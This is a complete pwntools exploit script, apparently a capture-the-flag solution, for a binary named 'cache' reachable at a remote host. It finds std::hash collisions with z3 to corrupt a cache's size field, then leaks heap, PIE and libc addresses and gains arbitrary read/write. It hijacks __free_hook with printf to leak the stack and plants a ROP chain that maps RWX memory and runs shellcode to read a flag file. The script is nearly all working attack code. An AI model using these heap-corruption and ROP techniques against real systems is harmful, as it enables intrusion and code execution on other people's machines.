#!/usr/bin/env python3

import itertools
import os

from pwn import *
from z3 import *

the_binary = "./cache"
# the_binary = "./cache.dbg"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc-2.31.so", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("3.139.106.4", 27015)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
elif args.GDB:
    io = gdb.debug(the_binary, """
        continue
    """)
else:
    io = process(
        ["./ld-2.31.so", the_binary],
        env={"LD_PRELOAD": os.path.abspath("./libc-2.31.so")}
    )

def std_hash(input_bv):
    def _shift_mix(v):
        # Need to use LShR since v is unsigned.
        return v ^ (LShR(v, 47))

    def _bit_not(n, numbits=64):
        return (1 << numbits) - 1 - n

    len_ = len(input_bv) 
    len_aligned = len_ & _bit_not(0b111)

    len_bvv = BitVecVal(len_, 64)
    seed = BitVecVal(0xc70f6907, 64)
    mul = BitVecVal(0xc6a4a793 << 32, 64) + BitVecVal(0x5bd1e995, 64)
    h = seed ^ (len_bvv * mul)

    # Iterate over string 8 bytes at a time.
    for i in range(0, len_aligned, 8):
        window = Concat(*reversed(input_bv[i:i+8]))
        data = _shift_mix(window * mul) * mul;
        h ^= data
        h *= mul

    # Account for remaining bytes.
    if len_ > len_aligned:
        padding = [BitVecVal(0, 8) for _ in range(8 - (len_ - len_aligned))]
        data = Concat(*(padding + input_bv[len_aligned:]))
        h ^= data
        h *= mul

    h = _shift_mix(h) * mul
    h = _shift_mix(h)
    return h

def bv_to_bytes(model, bv_list):
    return bytes([model[bv].as_long() for bv in bv_list])

def find_collision():
    # I think the portions < 8 bytes in length may print in reverse order.
    for one_len, two_len in itertools.product(range(1, 0x10), repeat=2):
        one_bv = [BitVec(f"one_{i}", 8) for i in range(one_len)]
        two_bv = [BitVec(f"two_{i}", 8) for i in range(two_len)]

        s = Solver()
        s.add(std_hash(one_bv) == std_hash(two_bv))

        for bv in itertools.chain(one_bv, two_bv):
            s.add(bv != 0x0)
            s.add(bv != 0xa)

        # Ensure we don't just compute the same two inputs.
        if one_len == two_len:
            if one_len == 1:
                s.add(one_bv[0] != two_bv[0])
            else:
                s.add(Concat(*one_bv) != Concat(*two_bv))

        log.info(f"Checking model for lengths {one_len} and {two_len}...")
        if s.check() != sat:
            log.info(f"Collision search failed")
            continue

        log.success("Got collision!")
        model = s.model()
        one_bytes = bv_to_bytes(model, one_bv)
        two_bytes = bv_to_bytes(model, two_bv)
        print(one_bytes)
        print(two_bytes)
        return one_bytes, two_bytes

# Program I/O wrappers.
def create(name, size):
    io.sendlineafter("> ", "1")
    io.sendlineafter("Name: ", name)
    io.sendlineafter("Size: ", str(size));

def read(name, offset, count):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Name: ", name)
    io.sendlineafter("Offset: ", str(offset))
    io.sendlineafter("Count: ", str(count))

def write(name, data, offset, count=None):
    if count is None:
        count = len(data)

    io.sendlineafter("> ", "3")
    io.sendlineafter("Name: ", name)
    io.sendlineafter("Offset: ", str(offset))
    io.sendlineafter("Count: ", str(count))
    io.sendafter("Data: ", data)

def erase(name):
    io.sendlineafter("> ", "4")
    io.sendlineafter("Name: ", name)

# find_collision takes ~15 minutes to run
# one, two = find_collision()
one = b"\x17"
two = b"#vJ\xe7\x01Q}\xbd"

# Start by getting a heap leak, which we achieve by editing the size of an
# existing cache via a hash collision of the unordered_map key.
# We will be leaking data from the next cache on the heap.
create(one, 8)
write(one, "xxxxzzzz", 0)
# The below cache is the one we'll use to leak heap pointers.
create("A", 0x10)
write("A", "brianbrian", 0)

# Hash collision causes the below create to edit the size of the cache.
create(two, 0x100)
read(one, 0, 0x100)

raw_leak = io.recvuntil("*******************************", drop=True)
print(hexdump(raw_leak))

pie_leak = u64(raw_leak[0x70:0x78])
elf.address = pie_leak - 0xcc70 
heap_leak = u64(raw_leak[0x78:0x80])
heap_base = heap_leak - 0x12090

log.success("Binary PIE base %#x" % elf.address)
log.success("Heap base %#x" % heap_base)

# We can now implement stable primitives by overwriting the base pointer with
# a very small address (we use 1 below) and the size field with a very large
# number. Combining these two tweaked fields, we can read from / write to an
# arbitrary offset from address 1 (i.e., anywhere in the address space).
# 
# 0x78 is the offset to the next cache's base pointer.
write(one, p64(1), 0x78)
# We also overwrite the size field to be the max unsigned integer, so we can
# write over the entirety of the address space.
write(one, p64(0xffffffffffffffff), 0x80)

def arb_write(where, what, is_addr=False):
    if is_addr:
        what = p64(what)
    write("A", what, offset=where-1)

def arb_read(where, size=None, is_addr=False):
    if size is None:
        if is_addr:
            size = 8
        else:
            log.error("Need size if not reading an address")

    read("A", offset=where-1, count=size)
    data = io.recvuntil("\n*******************************", drop=True)
    if is_addr:
        return u64(data)
    else:
        return data

assert arb_read(elf.address, size=4) == b"\x7fELF"
log.success("Implemented arbitrary read/write")

# Now do a libc leak with our arbitrary read.
strtoull_leak = arb_read(elf.got.strtoull, is_addr=True)
libc.address = strtoull_leak - libc.sym.strtoull

log.success("strtoull@libc == %#x" % strtoull_leak)
log.success("libc base == %#x" % libc.address)

# Replace __free_hook with printf so we can leak a stack pointer.
arb_write(libc.sym.__free_hook, libc.sym.printf, is_addr=True)
stack_leak_name = "%p."*0x10 + "A"*0x100
create(stack_leak_name, 0x10)
write(stack_leak_name, "brianbrian", 0)
erase(stack_leak_name)

# Our printf overwrite has caused a lot of pointer values to be displayed,
# including a stack pointer.
leak_data = io.recvuntil("\n*******************************", drop=True)
stack_leak = int(leak_data.split(b".")[22].decode(), 16)
log.success("Got stack leak: %#x" % stack_leak)
# This stack_base calculation is right a decent amount of the time.
stack_base = align_down(0x1000, stack_leak) - 0x1f000
log.success("Got stack base: %#x" % stack_base)

pop_rax = p64(libc.address + 0x000000000004a550)
pop_rdi = p64(libc.address + 0x0000000000026b72)
pop_rsi = p64(libc.address + 0x0000000000027529)
pop_rdx_pop_rbx = p64(libc.address + 0x0000000000162866)
syscall = p64(libc.address + 0x0000000000066229)
ret = p64(libc.address + 0x0000000000025679)
jmp_rax = p64(libc.address + 0x0000000000026e91)

mov_r9_rsi_jmp_rax = p64(libc.address + 0x0000000000081738)
mov_r10_rdx_jmp_rax = p64(libc.address + 0x000000000007b0cb)
mov_r8_rax_mov_rax_r8_pop_rbx = p64(libc.address + 0x0000000000156298)

mmap_fixed_addr = 0x7fe7a1e8f000
flag_buf = mmap_fixed_addr + 0x200
flag_len = 0x40

sc = ""
sc += shellcraft.echo("this is running\n")
sc += shellcraft.open("/home/cache/flag")
sc += shellcraft.read("rax", flag_buf, flag_len)
sc += shellcraft.write(1, flag_buf, flag_len)
sc = asm(sc)

rop = b""
rop += b"B"*8
# mmap RWX segment
rop += pop_rdi
rop += p64(mmap_fixed_addr)
rop += pop_rax
rop += ret
rop += pop_rdx_pop_rbx
rop += p64(constants.MAP_PRIVATE | constants.MAP_FIXED | constants.MAP_ANON)
rop += p64(0xcafebabedeadbeef)
rop += mov_r10_rdx_jmp_rax
rop += pop_rsi
rop += p64(0)
rop += mov_r9_rsi_jmp_rax
rop += pop_rax
rop += p64(0)
rop += mov_r8_rax_mov_rax_r8_pop_rbx
rop += p64(0xcafebabedeadbeef)
rop += pop_rsi
rop += p64(0x1000)
rop += pop_rdx_pop_rbx
rop += p64(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)
rop += p64(0xcafebabedeadbeef)
rop += pop_rax
rop += p64(constants.SYS_mmap)
rop += syscall
# read into mapped segment
rop += pop_rdi
rop += p64(0)
rop += pop_rsi
rop += p64(mmap_fixed_addr)
rop += pop_rdx_pop_rbx
rop += p64(len(sc))
rop += p64(0xcafebabedeadbeef)
rop += pop_rax
rop += p64(constants.SYS_read)
rop += syscall
# jump to shellcode
rop += pop_rax
rop += p64(mmap_fixed_addr)
rop += jmp_rax

# Now we use our arbitrary write to write a ROP chain into the stack of
# handleWrite, which will execute once the flow attempts to return out of
# handleWrite.
handle_write_stack = stack_leak + 0x40
arb_write(handle_write_stack, rop)

io.send(sc)
io.interactive()
